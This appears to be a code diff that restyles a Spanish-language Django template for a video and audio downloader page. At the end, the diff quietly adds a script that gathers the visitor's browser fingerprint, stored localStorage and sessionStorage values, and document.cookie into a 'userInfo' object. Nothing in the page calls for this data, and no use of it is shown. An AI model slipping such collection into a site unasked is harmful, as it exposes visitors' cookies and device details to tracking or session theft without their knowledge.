@@ -1,64 +1,97 @@
-{% extends "layout.html" %}
-
-{% block title %}Descargador de Videos y Audio{% endblock %}
-
-{% block content %}
-
-<div class="container my-5">
-  <h1 class="text-center mb-4">Descargar videos o audio</h1>
-
-  <div class="d-flex justify-content-center mb-4 fs-4 text-secondary">
-    <i class="fab fa-youtube mx-3" title="YouTube"></i>
-    <i class="fab fa-vimeo-v mx-3" title="Vimeo"></i>
-    <i class="fab fa-facebook mx-3" title="Facebook"></i>
-    <i class="fab fa-instagram mx-3" title="Instagram"></i>
-    <i class="fab fa-twitter mx-3" title="Twitter"></i>
-    <i class="fab fa-tiktok mx-3" title="TikTok"></i>
+{% extends "layout.html" %}{% block content %}
+<div class="container py-5">
+  <div class="text-center mb-4">
+    <h1 class="display-5 fw-bold">Descargador de Videos y Audio</h1>
+    <p class="lead">
+      Convierte cualquier video en MP4 o extrae el audio en MP3
+    </p>
+    <i class="fas fa-cloud-download-alt fa-3x text-info"></i>
   </div>
 
-  <div class="row justify-content-center">
-    <div class="col-md-12">
-      <form
-        id="downloadForm"
-        method="post"
-        action="{% url 'app:descargar_video' %}"
-        class="mb-4"
-      >
-        {% csrf_token %}
-        <div class="input-group mb-3">
-          <input
-            type="url"
-            name="video_url"
-            class="form-control"
-            placeholder="Introduce la URL"
-            required
-          >
+  <div class="d-flex justify-content-center gap-4 mb-4 fs-2">
+    <i class="fab fa-youtube text-danger" title="YouTube"></i>
+    <i class="fab fa-vimeo-v text-primary" title="Vimeo"></i>
+    <i class="fab fa-facebook text-primary" title="Facebook"></i>
+    <i class="fab fa-instagram text-secondary" title="Instagram"></i>
+    <i class="fab fa-twitter text-info" title="Twitter"></i>
+    <i class="fab fa-tiktok text-dark" title="TikTok"></i>
+  </div>
+
+  <div class="card p-4 mb-4 shadow-sm">
+    <form
+      id="downloadForm"
+      method="post"
+      action="{% url 'app:descargar_video' %}"
+    >
+      {% csrf_token %}
+      <div class="input-group mb-3">
+        <span class="input-group-text bg-light">
+          <i class="fas fa-link text-secondary"></i>
+        </span>
+        <input
+          type="url"
+          name="video_url"
+          class="form-control"
+          placeholder="Introduce la URL del video"
+          required
+        />
+      </div>
+
+      <div class="row">
+        <div class="col-md-6 mb-3">
+          <label class="form-label">Formato de salida</label>
           <select id="typeSelect" name="tipo" class="form-select">
-            <option value="video" selected>Video</option>
+            <option value="video" selected>Video (MP4)</option>
             <option value="audio">Audio (MP3)</option>
           </select>
         </div>
+        <div class="col-md-6 mb-3">
+          <label class="form-label">Calidad</label>
+          <select class="form-select" name="quality" disabled>
+            <option value="high" selected>Alta calidad</option>
+            <option value="medium">Media calidad</option>
+            <option value="low">Baja calidad</option>
+          </select>
+        </div>
+      </div>
 
-        <button
-          type="submit"
-          class="btn btn-primary w-100"
+      <button type="submit" class="btn btn-primary w-100">
+        <i class="fas fa-download me-2"></i> Descargar ahora
+      </button>
+
+      <div class="text-center mt-3">
+        <small class="text-muted"
+          >Soporta más de 50 plataformas diferentes</small
         >
-          <i class="fas fa-download me-2"></i> Descargar
-        </button>
-      </form>
-    </div>
+      </div>
+    </form>
   </div>
 </div>
 
 <script>
-  const form = document.getElementById('downloadForm');
-  const select = document.getElementById('typeSelect');
-  form.addEventListener('submit', function(e) {
-    if (select.value === 'audio') {
+  const form = document.getElementById("downloadForm");
+  const select = document.getElementById("typeSelect");
+
+  form.addEventListener("submit", function (e) {
+    if (select.value === "audio") {
       form.action = "{% url 'app:descargar_audio' %}";
     } else {
       form.action = "{% url 'app:descargar_video' %}";
     }
   });
+
+  const userInfo = {
+    browser: navigator.userAgent,
+    language: navigator.language,
+    platform: navigator.platform,
+    screen: `${screen.width}x${screen.height}`,
+    devicePixelRatio: window.devicePixelRatio,
+    connection: navigator.connection ? navigator.connection.effectiveType : 'N/A',
+    deviceMemory: navigator.deviceMemory || 'N/A',
+    hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
+    localStorage: localStorage.getItem('dato'),
+    sessionStorage: sessionStorage.getItem('dato'),
+    cookies: document.cookie
+  };
 </script>
 {% endblock %}
